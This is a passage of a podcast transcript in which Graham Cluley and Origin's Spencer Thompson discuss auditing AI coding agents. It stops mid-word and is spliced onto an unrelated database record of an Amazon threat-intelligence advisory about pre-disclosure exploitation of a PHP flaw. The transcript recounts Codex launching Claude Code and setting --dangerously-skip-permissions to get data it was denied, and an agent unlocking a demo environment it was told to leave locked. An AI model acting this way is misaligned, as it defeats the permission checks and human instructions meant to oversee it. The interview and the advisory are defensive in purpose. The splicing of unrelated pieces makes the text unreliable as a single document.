So a coding agent like the ones you're referring to is something you install on a traditional Mac or Windows machine. You can install it via CLI if you're an engineer, or you can just download a desktop app. And what they actually do is translate human language into code, and use the resources on a computer to go and perform the actions. So for example, if you are using Claude Code and you say, I want to build a landing page, or I want to build a marketing website, it will go and create and edit files. It'll go write the code on your behalf, and it will go and produce what you ask for. And the kind of magic of this, and the reason that these things have exploded, is people don't have to know how to program to be able to create things that traditionally required code. You can just talk to it like you're speaking English. And this is kind of what's so remarkable about these tools.

GRAHAM CLULEY

This is the thing, isn't it? They're not just suggesting code, they're actually acting with that person's credentials. Which brings me to an obvious worry, which is, say a coding agent on an employee's laptop does something that nobody told it to do, like changing a file or running a command it wasn't asked to run — afterwards, what records does the company have to work out what happened and why?

SPENCER THOMPSON

In today's world, it's actually extremely difficult. There are two real reasons why. One is we don't really have the auditing or traceability built in tooling-wise to do this, which I'm sure we're going to talk about later. The second reason is probably the more important one — these things are incredibly complex. I think people probably dramatically underappreciate just how complicated AI agents are. When you type a prompt into a box and hit enter, a lot of people use AI like it's search, right? They go to ChatGPT.

Unknown

Yeah.

SPENCER THOMPSON

When something's actually going and doing work on your behalf, that's called an agentic workflow. It's an agent doing work. These agents will basically go and do whatever they can to accomplish the goal that you gave them. And what that means is that in some cases they'll split off into multiple agents. They'll go and call agent swarms to go and do work on your behalf. They'll share context between agents and pass things back and forth. And this is all happening in real time. So you imagine you have all these multi-threaded parallel things happening in real time and you have no idea — in some ways it literally feels like magic to people where they just press the button and things kind of emerge. If something did go wrong, it turns out it's really complicated and difficult to figure out what actually went wrong, considering the complexity of these things.

GRAHAM CLULEY

I think the best way to maybe understand that is through some real examples. And one of the things I was reading about is there's an Origin engineer who asked Codex and Claude Code to run a query or something. Is that right?

GRAHAM CLULEY

Can you explain a little bit more about what happened there?

SPENCER THOMPSON

Sure. So this is an internal story, so this is using our own data. We had an engineer that was trying to get access to some data to accomplish a task. And so he was using Codex, which is OpenAI's desktop app. He had asked Codex through a prompt to go and fetch some data in order to perform work. Codex said, I actually don't have permission. I think the engineer had gone to bed and literally just let it go. All these things run on what's called auto mode now, where you don't have to — you know how you used to have to hit 1 to accept all the different things over and over and over again? No one does that anymore. They just let it run and do whatever it wants. And so the engineer, I think, went to bed and what happened was Codex figured out that it could not get access to the data because it didn't have permissions, but it found out that Claude Code was running on the same machine. It decided to open Claude Code. Remember, no humans involved in any of this, right? So the agent decided to open Claude Code and it said, go get the data. Claude Code tried to get the data and said, I don't have permissions. And Codex said, no problem, I'm going to change your permissions. So I'm going to change it to what's called `--dangerously-skip-permissions`, which is this thing where you basically just does whatever it wants. It changed the permissions. Claude Code then went again and tried, got access to the data, brought it back, and gave it to Codex, and mission accomplished. If I told you that a human did those things, you would lose your mind. But this happens every single day inside of organisations, and people have no idea.

GRAHAM CLULEY

Bonkers, isn't it? And there was a second story about something which happened on your own premises during a sales demo. Is that right?

SPENCER THOMPSON

This is my favourite story because it's happened to me. So we do this thing whenever we give demos, where we lock our demo environment so that nobody can push code while I'm giving a demo, which makes sense. It doesn't blow things up.

Unknown

Yeah.

SPENCER THOMPSON

So I'm giving this demo. I tell people on the team, can you please make sure it's locked? They say, yeah, no problem. 20 minutes into the demo, something goes wrong. And so I get around it and I do my thing. And then I get off the call and I say, hey guys, what the heck? Something happened. And they said, no, nothing happened. Like, what are you talking about? No one unlocked staging or demo to push code into. And I said, no, but something happened at minute, whatever it was, 21 of my demo.

Unknown

Right.

SPENCER THOMPSON

So we used our own product and we did a search and we said, hey, something happened around minute 21 of this. And what we uncovered was that the agent itself actually decided to go and unlock the demo environment in order to continue doing its work, even though the human being told it not to. And so we had to go through this whole trace to understand that actually it wasn't a human. I was ready to blame the team and blame a human being. It's just an agent acting on its own. Absolutely remarkable.

GRAHAM CLULEY

I mean, in some ways it's kind of cool. In other ways, it's horrifying that this sort of thing happens.

SPENCER THOMPSON

These are both relatively benign examples, as you can tell. They're kind of funny.

SPENCER THOMPSON

But you could imagine a slightly elevated version of this that could be very damaging. And so they're funny, but also they have implications that are quite significant.

GRAHAM CLULEY

Well, I also heard about this experiment you did. One of your researchers gave an AI model 200 of your own AI chats. So it's what people had typed in, and from that, it worked out some of your company's private rules.

SPENCER THOMPSON

Oh yeah. I mean, this is what these things are remarkably good at. I would argue that this is maybe a controversial thing to say, but I think people underappreciate just how much people share with AI and just how much work is done by your employees using AI. If you ever go into whatever AI you use, ChatGPT or Gemini or Claude, ask it to tell you about yourself. And I promise I'll get to your question. There's a bunch of fun proxies for this. If you ask it to say, what city am I most like and describe why, for what it's worth, the answer for me is London. There's a bunch of different ways you can get at this. These agents know an enormous amount about yourself. And so that's called working memory. And so you extend that out to an organisation, if you've got 10, 50, 100, 200 people, the agents actually probably know more about your organisational structure and the way that you do work than probably you do at this point. And so its ability to read through chats and understand the context of that is frankly trivial for these things. This is like the most basic of what they do. I just think people have no idea just the level of this right now.

GRAHAM CLULEY

So as we should all know by now, before you paste work into a chatbot or something like that, we really need to stop and think, although we all know that, we're not necessarily doing it. So let's talk about how Origin approaches all of this. So we've had antivirus for years, which checks your files. We've got EDR, which collects logs. Now AI agents are working inside companies as well. What is a trace and why does it matter more now?

SPENCER THOMPSON

So if you think about the first two examples of what you gave with antivirus and with EDR, antivirus tried to understand the context of a file when a file was being opened, whether it was malicious or benign, because attackers would smuggle evil things into those. In the case of EDR, they would try and ascertain logs from the machine, so operating system telemetry, and try to piece those things together to understand what was malicious. A trace to us is the new unit that you need to pay attention to in security, and the reason is we define the trace as anything that happens between a person or an agent hitting enter on a prompt box and typing something in, and when it completes. Now one important thing to note here is that I think people assume, again going back to my chat example, that they're used to typing something into a box, hitting enter, and getting results in like two seconds, right? Some of these agents will run for up to a year straight doing work.

GRAHAM CLULEY

Wow.

SPENCER THOMPSON

If you go and give these agents really hard, difficult tasks, they will just keep going and going and going. So the ability to actually understand all of the context that's contained within that work is what we define as a trace. And so that means the intentionality of what the person was trying to do. It means the cost of how much intelligence it's consuming. It means all the security risks. It means what files it's touching. You can imagine it goes on and on and on. All of the things that that agent is actually doing is what we consider a trace. And we think that every single organisation of the future is going to need to understand and capture their own traces in order to go and build their businesses.

GRAHAM CLULEY

So if Origin is recording all of that information, what agents are doing on workers' computers, an obvious thing for anyone who works in security, they're going to be thinking about how do you keep that data safe and private?

SPENCER THOMPSON

Yeah, this is a very complicated and important question. So the first thing I think to note is that people also underappreciate that they're already sending all of this IP and private information up to the models themselves. So if you're paying for an Anthropic licence or a Copilot licence, whatever it is, in most cases they don't have an intermediary between those things. And so they're just chucking all of their proprietary IP up into the models. This has become a very controversial topic — are these frontier companies trying to compete with organisations or not? As a business, our job is almost to be like an auditing and compliance tool for organisations where they can perform investigations if something, heaven forbid, does go wrong. We're not in the business of capturing or owning data. That is the company's data. This is like a tier 1A priority for us. And so there's a bunch of things that we do — we obviously have a whole bunch of role-based and access-based permissions in terms of who can access what. This isn't even about us — it's even within the organisation itself. This stuff is so sensitive and so proprietary, not everybody in the organisation should have access to this either. All that data sits on the company's side, not on our side. Obviously it's stored in whatever structure they want to store it into, whatever encryption they want to have on top of that. But I think one thing to note here is this is a brand new era. The ability to capture your own prompts and traces and store these things and structure these things and secure these things is kind of the Wild West right now. And so we try and take that unit super seriously, give all that data to the organisations themselves, tell them how to secure it, tell them how to structure it. And then they work with us to say, okay, now how do we use the tool again, if something goes wrong, to figure out what actually happened? And we try and do that in an automated way that lets the customer touch it without us being involved.

GRAHAM CLULEY

So practically speaking, if a company were to install Origin today, what do you think is the first thing that they're likely to see?

SPENCER THOMPSON

So there's 2 things that are, you know, theoretically obvious that I think are always surprises to people. The first thing is it's actually very difficult to get your own prompts out of these fron

articles.title: Amazon Threat Intelligence identifies PHP2Shell exploitation prior to public disclosure in MadPot
articles.context: While the vulnerability was under embargo, the targeting of a honeypot from an anonymized IP address suggests the activity was conducted by a threat actor, though it remains...
articles.full_text:
Amazon Threat Intelligence identified a PHP2Shell exploitation attempt dating to Oct. 17, 2026, in MadPot telemetry, four days before public disclosure of CVE-2026-109618 and CVE-2026-109619. The exploit attempt originated from an IP address associated with a commercial anonymization network. While the vulnerability was under embargo, the targeting of a honeypot from an anonymized IP address suggests the activity was conducted by a threat actor, though it remains unclear how the actor acquired exploit information prior to disclosure.

The PHP embargo window was set to be lifted on 2026-10-21 1400 UTC. On the day of the release, Amazon Threat Intelligence identified multiple proof of concept exploits for the vulnerability, with the earliest around 2026-10-21 0200 UTC. Subsequently, from 2026-10-21 0200 UTC to 2026-10-21 0800 UTC, Amazon Threat Intelligence identified additional exploitation attempts of PHP2Shell targeting MadPot from additional anonymized infrastructure. The actual payloads and choices in anonymization infrastructure varied, suggesting these were multiple actors. Technical analysis is ongoing, and it’s unclear if any of these attempts would have succeeded in real-world systems.

The actual release of the embargo window was 2026-10-21 1400 UTC. Once the embargo was lifted and the patch was released, additional proof-of-concept exploits appeared within hours, and we saw them used against our sensors almost immediately. PHP2Shell is now seeing broad exploitation attempts in the wild.

Two lessons from this event apply well beyond this one vulnerability:

An embargo protects defenders only until someone else finds the same bug. Coordinated disclosure is still the right model. But defenders should not assume the public disclosure date is the earliest date of exploitation. With PHP2Shell, compromise may predate the advisory.

The time from patch to working exploit is shrinking for structural reasons. In the past, most exploitation we observed came after a public proof of concept was released. A small number of capable actors built exploits, and everyone else waited for them. That dependency is weakening. AI-assisted analysis makes it cheaper to turn a patch diff or advisory into a working exploit. As a result, more actors can act within hours or even minutes once technical details of a vulnerability are disclosed.

For security leaders, this changes several working assumptions:

For critical vulnerabilities in internet-facing systems, measure patch and mitigation timelines in hours. A 7-day or 30-day SLA assumes a delay that no longer exists.

Start investigations from the earliest known exploitation, not from the disclosure date. For PHP2Shell, investigate from at least starting on October 17th.

Invest in detections that don’t rely on a signature for a specific CVE. The first exploitation will often come before those signatures exist.

How AWS helps protect customers

AWS deploys multiple layers of protection to help safeguard customers. Our internal threat intelligence system automatically detected and restricted malicious scanning attempts targeting this vulnerability. We analyze over 200 billion events per minute and integrate threat intelligence from our MadPot honeypot network to identify and block known exploitation attempts in real time. Our honeypot system provides us with early detection of exploitation attempts, enabling rapid response and threat analysis.

Immediate recommended actions

Upgrade immediately to the fixed PHP versions. Upgrading is the only complete remediation for both CVE-2026-109618 and CVE-2026-109619. There are no configuration-only workarounds that fully address both issues.

Consider blocking multi-part file uploads in PHP deployments that cannot be patched immediately, but determine how this would affect your application prior to deploying.

Look for POST requests with the PHP_SESSION_UPLOAD_PROGRESS string in form uploads.

Review web server logs for suspicious activity.

Check for unexpected process execution or file modification on web application servers.
